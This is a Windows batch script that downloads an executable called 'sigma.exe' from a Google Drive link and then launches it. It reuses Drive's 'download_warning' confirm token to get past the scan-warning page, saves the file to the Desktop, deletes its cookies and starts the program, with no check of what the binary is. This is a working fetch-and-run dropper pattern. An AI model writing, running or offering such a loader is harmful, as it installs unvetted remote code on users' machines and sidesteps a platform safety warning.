@echo off
setlocal enabledelayedexpansion

:: Set variables
set "file_id=1OusHDWVDFTfGv16fnReXJlAugOye1bhj"
set "file_name=sigma.exe"
set "download_url=https://drive.google.com/uc?export=download&id=%file_id%"
set "cookies_file=%temp%\cookies.txt"
set "output_file=%userprofile%\Desktop\%file_name%"

:: Check if curl is available
where curl >nul 2>&1
if %errorlevel% neq 0 (
    echo Error: curl is not installed or not in the system PATH.
    exit /b 1
)

:: Download the file using curl
echo Downloading %file_name%...
curl -c "%cookies_file%" -s -L "%download_url%" > nul
for /f "tokens=1* delims==" %%A in ('findstr /i "download_warning" "%cookies_file%"') do set "confirm=%%B"
if defined confirm (
    curl -Lb "%cookies_file%" "%download_url%&confirm=!confirm!" -o "%output_file%" -J -L
) else (
    curl -Lb "%cookies_file%" "%download_url%" -o "%output_file%" -J -L
)

:: Clean up cookies file
del "%cookies_file%" >nul 2>&1

:: Check if download was successful
if not exist "%output_file%" (
    echo Error: Failed to download %file_name%.
    exit /b 1
)

:: Open the downloaded file
echo Opening %file_name%...
start "" "%output_file%"

echo Done.
endlocal